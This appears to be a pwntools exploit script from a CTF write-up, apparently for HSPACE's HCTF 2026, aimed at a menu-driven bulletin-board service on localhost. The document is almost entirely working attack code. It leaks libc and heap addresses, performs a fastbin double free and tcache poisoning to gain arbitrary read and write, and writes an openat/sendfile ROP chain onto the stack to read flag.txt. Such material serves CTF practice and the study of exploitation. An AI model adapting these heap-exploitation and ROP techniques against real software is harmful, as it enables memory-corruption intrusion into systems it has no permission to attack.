![HSPACE](https://blog.hspace.io/posts/hctf-2026-writeup/#cdoutside)

```python
from pwn import *


io = remote('localhost', 17284)

def signup(i,p):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Username:', i)
    io.sendlineafter(b'Password:', p)

def signin(i,p):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Username:', i)
    io.sendlineafter(b'Password:', p)

def create_post(title,content):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Title:',title)
    io.sendlineafter(b'Content:',content)

def edit_post(post_id, content):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Post ID:',post_id)
    io.sendlineafter(b'New content:',content)

def delete_post(post_id):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Post ID:',post_id)

def write_comment(post_id, comment):
    io.sendlineafter(b'> ', b'6')
    io.sendlineafter(b'Post ID:',post_id)
    io.sendlineafter(b'Comment:',comment)

def delete_comment(comment_id):
    io.sendlineafter(b'> ', b'7')
    io.sendlineafter(b'Comment ID:', comment_id)

def edit_bio(bio_string):
    io.sendlineafter(b'> ', b'11')
    io.sendlineafter(b'New bio: ', bio_string)

def view_bio():
    io.sendlineafter(b'> ', b'10')

def viewnoti():
    io.sendlineafter(b'> ', b'8')

def clearnoti():
    io.sendlineafter(b'> ', b'9')

def logout():
    io.sendlineafter(b'> ', b'13')

def delete_account():
    io.sendlineafter(b'> ', b'14')
    io.sendlineafter(b' confirm:',b'DELETE')


# [1] libc leak, heap leak
signup(b'test1',b'test1')
signup(b'test2',b'test2')

signin(b'test1',b'test1')
postname = b'NEWPOST'
create_post(postname, b'MYNEWPOST') # Post Num.0
logout()

signin(b'test2',b'test2') # Write Comment -> tcache & smallbin
create_post(postname, b'MYNEWPOST') # Post Num.1
big_comment = b'A'*(0x100-1)
for _ in range(9):
    write_comment(b'0',big_comment)
for i in range(8):
    delete_comment(str(i).encode('UTF-8'))
logout()

signin(b'test1',b'test1')
viewnoti() # free + memleak !!

io.recvuntil(b"[1] test2 commented on your post \'" + postname + b"\': ")
libb = u64(io.recvn(6) + b'\x00'*2) - 0x21ace0
io.recvuntil(b"[8] test2 commented on your post \'" + postname + b"\': ")
heapb = u64(b'\x00'*2 + io.recvn(5) + b'\x00')
heapb >>= 4
print(b'[+] libc base : ',hex(libb))
print(b'[+] heap base : ',hex(heapb))
logout()

# [2] [0x30] double free & fastbin dup
# test3 -> prepare bins
# test4 -> target (1 notif)
signup(b'test3',b'test3')
signup(b'test4',b'test4')
signup(b'victim',b'victim')

signin(b'test3',b'test3')
create_post(postname, b'MYNEWPOST') # Post Num.2
logout()

signin(b'test4',b'test4')
create_post(postname, b'MYNEWPOST') # Post Num.3
small_comment = b'B'*0x31
for _ in range(7):
    write_comment(b'2',small_comment) # send 7 notif
logout()

signin(b'test3',b'test3')
write_comment(b'3',small_comment) # send 1 notif
logout()

signin(b'test4',b'test4')
write_comment(b'1',small_comment) # prepare to prevent fasttop error
logout()

signin(b'test3',b'test3')
clearnoti() # 7 notification(s)
logout()


signin(b'test4',b'test4')
clearnoti() # fastbin
logout()

signin(b'test2',b'test2')
clearnoti() # prevent fasttop
logout()
signin(b'test4',b'test4')
clearnoti() # fastbin

# [3] allocate bio_string 
target = heapb + 0x14f8-8#+8
current = heapb + 0x1b40
for _ in range(7):
    write_comment(b'3',small_comment) # exhaust tcache bins

new_bio = p64(target ^ (current >> 12)).ljust(0x31,b'\x00')
edit_bio(new_bio)
logout()

signin(b'test3',b'test3')
dum = b'\x41'*0x32
edit_bio(new_bio)
logout()


signin(b'test2',b'test2')
dum = b'\x41'*0x32
edit_bio(new_bio)
logout()

signin(b'test3',b'test3')
dum = b'\x41'*0x32
edit_bio(new_bio)
logout()

signin(b'test1',b'test1')
dum = b'A'*0x32
edit_bio(new_bio)
logout()

# test1 -> victim
# AAW Primitive is set !!
def AAW(target, data):
    print('[+] AAW  [',hex(u64(target)),'] = ', hex(u64(data)))
    signin(b'test1', b'test1')
    edit_bio(p64(0) + p32(1) + p32(1) + target + p32(0xa0)+p32(0xa0)) # bio mode set =1
    logout()
    signin(b'victim', b'victim')
    if int.from_bytes(b"flag.txt", "little") == u64(data):
        edit_bio(data)
    else:
        edit_bio(data[:-1]) # off by one
    logout()

def AAR(target):
    signin(b'test1', b'test1')
    edit_bio(p64(0) + p32(1) + p32(1) + target + p32(0xa0)+p32(0xa0))
    logout()
    signin(b'victim', b'victim')
    view_bio()
    io.recvuntil(b'Bio:')
    leak = io.recvline()[:-1].strip()
    leak = u64(leak + b'\x00'*2)
    logout()
    print('[+] AAR : ',hex(leak))
    return leak

environ = p64(0x222200 + libb) 
stack = AAR(environ)
start = stack - 0x140 # rop chain start address
#page = start & ~0xfff
AT_FDCWD = -100 & 0xffffffff
rop = [
        libb+0x2a3e5, # poprdi
        AT_FDCWD, # current dir
        libb+0x2be51, # poprsi
        start+19*8, # flag ptr
        libb+0x11f367, # poprdx
        0x0, # flag(rdonly)
        0x0, # dummy
        libb+0x1146f0, # openat
        
        libb+0x2a3e5, # poprdi
        1, # outfd
        libb+0x2be51, # poprsi
        5, # infd
        libb+0x11f367, # poprdx
        0x0, # offset
        0x0, # dummy
        libb+0x3d1ee, # pop rcx
        0x40,
        libb+0x1191F0, # libc_sendfile
        0,
        int.from_bytes(b"flag.txt", "little")
        ]

for i,r in enumerate(rop[1:]):
    AAW(p64(start+8+i*8),p64(r)) # +8 : return address

pause()
AAW(p64(start), p64(rop[0]))

io.interactive()



```
